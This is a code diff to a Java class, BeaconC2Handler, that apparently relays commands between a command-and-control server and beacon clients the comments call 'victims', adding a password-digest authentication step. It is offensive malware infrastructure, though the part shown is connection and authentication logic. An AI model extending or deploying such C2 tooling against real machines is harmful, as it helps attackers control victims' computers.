@@ -8,8 +8,12 @@ import Servers.Duplexer;
 public class BeaconC2Handler implements Runnable{
     // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
     private BeaconServer beaconServer;
+
     // Pointer to the C2 Server that the user interacts with the user
     private Duplexer C2Server;
+
+    // Hashed Password for Authentication to the C2 Server
+    private String passwordDigest;
 
     /**
      * This starts a thread that sends and receives messages with the C2 Server
@@ -21,10 +25,11 @@ public class BeaconC2Handler implements Runnable{
      * @param C2ServerIPAddress The IP Address of the C2 Server
      * @throws IOException
      */
-    public BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress) throws IOException{
+    public BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
         this.beaconServer = beaconServer;
         Socket socket = new Socket(C2ServerIPAddress, 1234);
         this.C2Server = new Duplexer(socket);
+        this.passwordDigest = passwordDigest;
     }
 
     /**
@@ -51,7 +56,24 @@ public class BeaconC2Handler implements Runnable{
          *      Client Status Updates
          *          All, Windows, Linux, or Specific Computer
          */
-        while(true){
+
+        // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
+        // message to the Beacon Server for further distribution.
+        Boolean authenticationSentinel = true;
+        C2Server.send(passwordDigest);
+        try{
+            String message = C2Server.receive();
+            if(!(message.equals("Authentication Successful"))){
+                String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
+                beaconServer.quit(reason);
+                C2Server.close();
+                authenticationSentinel = false;
+            }
+        }catch(IOException e){
+            e.printStackTrace();
+        }
+        
+        while(authenticationSentinel){
             try{
                 String message = C2Server.receive();
                 String[] tokens = message.split(" ");
